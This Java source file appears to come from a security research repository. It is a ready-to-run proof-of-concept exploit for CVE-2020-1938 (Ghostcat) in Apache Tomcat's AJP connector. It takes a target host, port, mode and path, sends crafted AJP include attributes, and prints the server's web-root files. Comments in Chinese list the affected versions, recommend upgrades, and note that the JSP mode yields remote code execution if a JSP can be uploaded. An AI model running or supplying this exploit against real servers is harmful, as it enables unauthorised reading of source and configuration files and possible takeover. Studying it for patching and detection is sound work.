package com.threedr3am.bug.tomcat.ajp;

import com.threedr3am.bug.tomcat.ajp.support.SimpleAjpClient;
import com.threedr3am.bug.tomcat.ajp.support.TesterAjpMessage;
import java.io.IOException;

/**
 * CVE-2020-1938
 *
 *
 * 该文件包含漏洞影响以下版本：
 *
 * 7.*分支7.0.100之前版本，建议更新到7.0.100版本；
 *
 * 8.*分支8.5.51之前版本，建议更新到8.5.51版本；
 *
 * 9.*分支9.0.31之前版本，建议更新到9.0.31版本
 *
 *
 *
 *
 * arg[0]：tomcat的ip
 * arg[1]：tomcat的port
 * arg[2]：file或jsp，file：读取web资源根目录的文件），jsp：渲染web资源根目录的jsp文件）
 * arg[3]：/index.jsp（资源路径，根号表示web资源根目录）
 *
 * @author threedr3am
 */
public class FileRead {

  public static void main(String[] args) throws IOException {
    // open connection
    SimpleAjpClient ac = new SimpleAjpClient();
    String host = "localhost";
    int port = 8009;
    String uri = "/xxxxxxxxxxxxxxxest.xxx";
    //todo jsp文件渲染，若可以上传jsp文件，即可RCE
//    String uri = "/xxxxxxxxxxxxxxxest.jsp";
    String file = "/index.jsp";
    if (args.length == 4) {
      host = args[0];
      port = Integer.parseInt(args[1]);
      uri = args[2].equalsIgnoreCase("file") ? uri : "/xxxxxxxxxxxxxxxest.jsp";
      file = args[3];
    }
    ac.connect(host, port);

    // create a message that indicates the beginning of the request
    TesterAjpMessage forwardMessage = ac.createForwardMessage(uri);
    forwardMessage.addAttribute("javax.servlet.include.request_uri", "1");
    forwardMessage.addAttribute("javax.servlet.include.path_info", file);
    forwardMessage.addAttribute("javax.servlet.include.servlet_path", "");

    forwardMessage.end();

    ac.sendMessage(forwardMessage);
    while (true) {
      byte[] responseBody = ac.readMessage();
      if (responseBody == null || responseBody.length == 0)
        break;
      System.out.print(new String(responseBody));
    }
    ac.disconnect();
  }
}
